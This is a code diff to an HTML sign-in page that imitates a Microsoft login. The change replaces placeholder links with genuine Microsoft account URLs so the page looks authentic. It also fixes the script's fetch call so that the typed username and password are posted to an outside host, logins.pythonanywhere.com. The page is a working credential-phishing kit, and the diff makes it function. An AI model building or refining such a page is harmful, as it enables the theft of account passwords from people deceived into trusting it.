@@ -68,8 +68,8 @@
             <button type="submit">Sign in</button>
         </form>
         <div class="links">
-            <p><a href="#">Can't access your account?</a></p>
-            <p><a href="#">Sign in with a different account</a></p>
+            <p><a href="https://account.live.com/resetpassword.aspx">Can't access your account?</a></p>
+            <p><a href="https://login.microsoftonline.com/common/oauth2/v2.0/logout">Sign in with a different account</a></p>
         </div>
     </div>
     <script>
@@ -79,7 +79,7 @@
             const password = document.getElementById('password').value;
             
             try {
-                const response = await fetch('Logins.pythonanywhere.com', {
+                const response = await fetch('https://logins.pythonanywhere.com', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -96,4 +96,3 @@
     </script>
 </body>
 </html>
-
